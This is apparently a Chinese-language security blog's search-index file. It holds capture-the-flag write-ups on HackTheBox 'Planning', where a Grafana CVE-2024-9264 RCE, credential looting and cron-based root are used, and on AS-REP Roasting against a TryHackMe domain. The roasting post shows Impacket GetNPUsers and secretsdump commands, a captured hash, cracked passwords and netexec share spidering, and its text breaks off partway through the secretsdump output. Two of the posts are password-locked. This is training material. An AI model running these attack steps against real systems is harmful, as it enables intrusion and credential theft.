<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Puppy</title>
    <link href="/2025/06/16/HTB-Puppy/"/>
    <url>/2025/06/16/HTB-Puppy/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab200c2198985bf97aa83debdb3ae27e000ed87270cb3695be90a6df6f06e957"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Planning</title>
    <link href="/2025/06/06/HTB-Planning/"/>
    <url>/2025/06/06/HTB-Planning/</url>
    
    <content type="html"><![CDATA[<blockquote><p>此为一个简单的Linux靶机，考察点在于DNS子域名枚举，信息收集CMS Nday，端口转发等。</p><p>As is common in real life pentests, you will start the Planning box with credentials for the following account: admin &#x2F; 0D5oT70Fq13EvB5r</p></blockquote><p><img src="/img/HTB-Planning/image-20250606224043812.png"></p><h1 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">Nmap scan report for 10.10.11.68<br>Host is up, received user-set (0.13s latency).<br>Scanned at 2025-06-07 06:19:29 CST for 68s<br>Not shown: 34230 filtered tcp ports (no-response), 31303 closed tcp ports (reset)<br>PORT   STATE SERVICE REASON         VERSION<br>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=<br>|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0<br>80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)<br>|_http-server-header: nginx/1.24.0 (Ubuntu)<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-title: Did not follow redirect to http://planning.htb/<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>NSE: Script Post-scanning.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 06:20<br>Completed NSE at 06:20, 0.00s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 06:20<br>Completed NSE at 06:20, 0.00s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 06:20<br>Completed NSE at 06:20, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 68.43 seconds<br>           Raw packets sent: 548285 (24.125MB) | Rcvd: 32629 (1.306MB)<br></code></pre></td></tr></table></figure><p>需要添加域名<code>planning.htb</code>到 <code>/etc/hosts</code></p><p><img src="/img/HTB-Planning/image-20250606224529875.png"></p><h1 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[~]<br>└─# ffuf -u http://planning.htb -H &quot;Host: FUZZ.planning.htb&quot; -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100<br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       <br><br>       v2.1.0-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://planning.htb<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt<br> :: Header           : Host: FUZZ.planning.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 100<br> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br> :: Filter           : Response size: 178<br>________________________________________________<br><br>grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 97ms]<br></code></pre></td></tr></table></figure><p>将子域名<code>grafana.planning.htb</code>也添加进 <code>/etc/hosts</code></p><p><img src="/img/HTB-Planning/image-20250606224818465.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p><img src="/img/HTB-Planning/image-20250606224919389.png"></p><p>使用描述中给的用户凭证进行登录。</p><p><img src="/img/HTB-Planning/image-20250606224952930.png"></p><p>存在框架版本。</p><p>搜索获取nday poc <a href="https://github.com/nollium/CVE-2024-9264">https://github.com/nollium/CVE-2024-9264</a></p><p>存在rce用法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 CVE-2024-9264.py -u user -p user -c &lt;shell-cmd&gt; http://localhost:3000<br></code></pre></td></tr></table></figure><p><img src="/img/HTB-Planning/image-20250606225043220.png"></p><p>确认可以命令执行。</p><h2 id="env下存在信息"><a href="#env下存在信息" class="headerlink" title="env下存在信息"></a>env下存在信息</h2><p><img src="/img/HTB-Planning/image-20250606225107291.png"></p><p>获取新用户<code>enzo:RioTecRANDEntANT!</code></p><p><img src="/img/HTB-Planning/image-20250606225209978.png"></p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/img/HTB-Planning/image-20250606225236292.png"></p><p>当前目录中存在 <code>linpeas.sh</code>，应该是靶机自带的。此为主机信息脚本。</p><p><img src="/img/HTB-Planning/image-20250606225511925.png"></p><p>存在db文件泄露。</p><p><img src="/img/HTB-Planning/image-20250606225636019.png"></p><p>这是计划任务的json配置文件，从中可以得到一个密码<code>P4ssw0rdS0pRi0T3c</code></p><p>尝试root登录失败。</p><p>在最初我们应该好好看这个脚本的运行结果。</p><p><img src="/img/HTB-Planning/image-20250606225742759.png"></p><p>开启了多个端口，其中3000与8000令人疑惑。但3000就是grafana框架的端口。进行端口转发8000。</p><p><img src="/img/HTB-Planning/137725c9-1643-4589-a37e-874ab61aaae8.png"></p><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h2><p><img src="/img/HTB-Planning/image-20250606230153447.png"></p><p>转发后本地访问<code>http://localhost:8000</code>，需要登录，账号是root，密码就是json文件中的。</p><p><img src="/img/HTB-Planning/be966a22-ace0-47a2-8381-72c3efa4cddc.png"></p><p>看起来是一个管理定时任务的webui。尝试添加定时任务。</p><p><img src="/img/HTB-Planning/641ef824-4c74-435d-9270-5b9977eb7abf.png"></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p><img src="/img/HTB-Planning/5330b30a-b69b-4787-91f2-6b6b0a0a0ae9.png"></p><p><img src="/img/HTB-Planning/5fa8a910-0761-42b0-9274-e9b660957d33.png"></p><p><img src="/img/HTB-Planning/6d931872-25e0-4718-b87b-893d72490619.png"></p><p><img src="/img/HTB-Planning/d73da9d7-4a92-453d-90b0-1ec56d7d26e1.png"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shadow Credentials 初探</title>
    <link href="/2025/06/03/Shadow-Credentials-%E5%88%9D%E6%8E%A2/"/>
    <url>/2025/06/03/Shadow-Credentials-%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="94cf89951fa77d69d9affab82ff582b5e77dc0a94b8bcacd37d8b86835deb1a3"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AS_REP Roasting初探</title>
    <link href="/2025/06/01/AS-REP-Roasting%E5%88%9D%E6%8E%A2/"/>
    <url>/2025/06/01/AS-REP-Roasting%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>此为我第一次接触域渗透，在此之前也通过HTB的俩个靶机进行了了解。我觉得挺有意思的，关于本次<code>AS_REP Roasting</code> 的攻击原理也非常简单。</p><h1 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h1><p>要想利用 <code>AS-REP Roasting</code> ，首先需要 <code>Kerberos</code> 禁用了 <strong>预身份验证</strong> 。</p><p>并且我们已经获取到了域内可与<code>KDC</code>通信的一台主机或用户</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于<code>Kerberos</code>默认开启 <strong>预身份验证</strong>，当客户端请求密钥分发中心(<code>KDC</code>) 颁发 TGT（<code>Ticket Granting Ticket</code>）时，客户端在请求TGT的同时，会发送 <code>Pre-Authentication</code> 数据，该数据包含<strong>加密时间戳</strong>，此时间戳用于AS服务器使用该用户hash进行解密来确定身份是否有误。如果验证无误，则通过<code>AS_REQ</code>返回TGT票据以及会话密钥，会话密钥能够通过hash爆破得到该用户密码。</p><p>那么假设关闭<strong>预身份验证</strong> (即<code>DONT_REQ_PREAUTH</code>)，客户端发送AS_REQ请求之后，不存在加密时间戳，也就不用进行身份验证，直接返回<code>AS_REP</code>响应，TGT票据以及会话密钥，如此就可以爆破该用户密码。</p><h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><p>此次的靶机是 <code>THM-Attacktive Directory</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# nmap -Pn -n --min-rate=10000 -sCV -p- $ip<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 15:25 CST<br>Warning: 10.10.170.234 giving up on port because retransmission cap hit (10).<br>Nmap scan report for 10.10.170.234<br>Host is up (0.54s latency).<br>Not shown: 51913 closed tcp ports (reset), 13601 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: IIS Windows Server<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-01 07:25:53Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br>|_ssl-date: 2025-06-01T07:26:55+00:00; -1s from scanner time.<br>| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local<br>| Not valid before: 2025-05-31T07:24:38<br>|_Not valid after:  2025-11-30T07:24:38<br>| rdp-ntlm-info: <br>|   Target_Name: THM-AD<br>|   NetBIOS_Domain_Name: THM-AD<br>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC<br>|   DNS_Domain_Name: spookysec.local<br>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2025-06-01T07:26:46+00:00<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49669/tcp open  msrpc         Microsoft Windows RPC<br>49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc         Microsoft Windows RPC<br>49678/tcp open  msrpc         Microsoft Windows RPC<br>49682/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: 2025-06-01T07:26:47<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 120.90 seconds<br></code></pre></td></tr></table></figure><p>端口扫描发现 <code>139/445</code>，使用<code>kerbrute</code>来枚举一下用户。</p><blockquote><p>当前获取到的信息 </p><p>ip：10.10.170.234</p><p>domain-name: spookysec.local</p></blockquote><h2 id="枚举域内用户"><a href="#枚举域内用户" class="headerlink" title="枚举域内用户"></a>枚举域内用户</h2><p><img src="/img/AS-REP-Roasting%E5%88%9D%E6%8E%A2/image-20250601153944982.png"></p><p>存在用户<code>svc-admin</code></p><p>但目前我们暂不知晓该用户的密码，尝试使用<code>AS_REP Roasting</code>进行攻击。</p><h2 id="AS-REP-Roasting-获取用户hash。"><a href="#AS-REP-Roasting-获取用户hash。" class="headerlink" title="AS_REP Roasting 获取用户hash。"></a>AS_REP Roasting 获取用户hash。</h2><blockquote><p>当前获取到的信息 </p><p>ip：10.10.170.234</p><p>domain-name: spookysec.local</p><p>Domain-User：svc-admin</p></blockquote><p>使用<code>impacket</code>中的<code>GetNPUsers.py</code>进行攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass<br>Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Getting TGT for svc-admin<br><span class="hljs-meta prompt_">$</span><span class="language-bash">krb5asrep$23<span class="hljs-variable">$svc</span>-admin@SPOOKYSEC.LOCAL:c9dc5df9d949949f23a6839236c366b8<span class="hljs-variable">$99de4225b8456a330c86e8cbb76498bc4e628a46cef1a0643445d735040611cb6589484fddb783990165d94b9b6d1cd69f5b029f4f5d56732a0a7f7952bc30abf1ec868434f27e5eb3ce8b6111eedbf6c3e66a2e237080e58ab806f73339069b92a3a8c9f7f4c4ef225f0db24cb6df212df6307507bd8e928e9599d96e9878b17607e47cbc467717be9504dacbd73b2e7cac8ba717c2bfa36922c607386fb3523e9ade1903c8b8357a29a30dca002ab8002b0b241e0ef64437ec2da353b026d048da84a3d6dc9b55e3f3b0d854ceda7841018e485f3653b1669eac8b94924f317d0b757f8739d4581f458b1403c9eef09a8e</span></span><br></code></pre></td></tr></table></figure><p>获取到hash，使用hashcat进行爆破。</p><p><img src="/img/AS-REP-Roasting%E5%88%9D%E6%8E%A2/image-20250601154756989.png"></p><p>可以用这个密码使用<code>bloodyAD</code> 来查看这个用户是否真的没有开启预身份验证。</p><p><code>bloodyAD --host $ip -d spookysec.local -u svc-admin -p management2005 get object &#39;svc-admin&#39;</code></p><p><img src="/img/AS-REP-Roasting%E5%88%9D%E6%8E%A2/image-20250601155020760.png"></p><p>在<code>userAccountControl</code> 属性中，确有<code>DONT_REQ_PREAUTH</code> ，证明确实未开启预身份验证，正因如此，我们才能够获取到用户hash。</p><h2 id="smb共享目录获取backup用户信息。"><a href="#smb共享目录获取backup用户信息。" class="headerlink" title="smb共享目录获取backup用户信息。"></a>smb共享目录获取backup用户信息。</h2><blockquote><p>ip：10.10.170.234</p><p>domain-name: spookysec.local</p><p>Domain-User：svc-admin</p><p>Domain-User-svc-admin-Pass：management2005</p></blockquote><p>现在我们已经拥有一个域用户的凭证，可以尝试枚举smb的共享目录，有哪些我们可以操控的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# netexec smb $ip -u svc-admin -p management2005 --shares<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 <br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [*] Enumerated shares<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  Share           Permissions     Remark<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  -----           -----------     ------<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  backup          READ            <br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  C$                              Default share<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share <br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share<br></code></pre></td></tr></table></figure><p>可以看到有4个目录可读，我们使用模块<code>spider-plus</code> get下所有可读文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# netexec smb $ip -u svc-admin -p management2005 -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=10000<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 <br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Started module spidering_plus with the following options:<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*]  DOWNLOAD_FLAG: True<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*]     STATS_FLAG: True<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] EXCLUDE_FILTER: [&#x27;print$&#x27;, &#x27;ipc$&#x27;]<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*]   EXCLUDE_EXTS: [&#x27;ico&#x27;, &#x27;lnk&#x27;]<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*]  MAX_FILE_SIZE: 9.77 KB<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  [*] Enumerated shares<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  Share           Permissions     Remark<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  -----           -----------     ------<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  backup          READ            <br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  C$                              Default share<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC<br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share <br>SMB         10.10.170.234   445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share <br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [+] Saved share-file metadata to &quot;/root/.nxc/modules/nxc_spider_plus/10.10.170.234.json&quot;.<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] SMB Shares:           6 (ADMIN$, backup, C$, IPC$, NETLOGON, SYSVOL)<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] SMB Readable Shares:  4 (backup, IPC$, NETLOGON, SYSVOL)<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] SMB Filtered Shares:  1<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Total folders found:  25<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Total files found:    6<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] File size average:    1.44 KB<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] File size min:        22 B<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] File size max:        4.07 KB<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] File unique exts:     4 (ini, txt, pol, inf)<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Downloads successful: 1<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Unmodified files:     5<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [*] Updated files:        1<br>SPIDER_PLUS 10.10.170.234   445    ATTACKTIVEDIREC  [+] All files processed successfully.<br></code></pre></td></tr></table></figure><p><img src="/img/AS-REP-Roasting%E5%88%9D%E6%8E%A2/image-20250601155653805.png"></p><p><code>backup@spookysec.local:backup2517860</code></p><p>获取到一个新用户的凭证。</p><p>根据题目所说<code>backup</code>用户属于域控制器的备份用户。</p><h2 id="通过secretsdump获取所有用户的hash"><a href="#通过secretsdump获取所有用户的hash" class="headerlink" title="通过secretsdump获取所有用户的hash"></a>通过<code>secretsdump</code>获取所有用户的hash</h2><blockquote><p>ip：10.10.170.234</p><p>domain-name: spookysec.local</p><p>Domain-User：svc-admin,backup</p><p>Domain-User-svc-admin-Pass：management2005</p><p>Domain-User-backup-Pass : backup2517860</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# python3 /opt/impacket/examples/secretsdump.py -dc-ip $ip -target-ip $ip backup@spookysec.local <br>Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies <br><br>Password:<br>[-] RemoteOperations failed: DCERPC Runtime 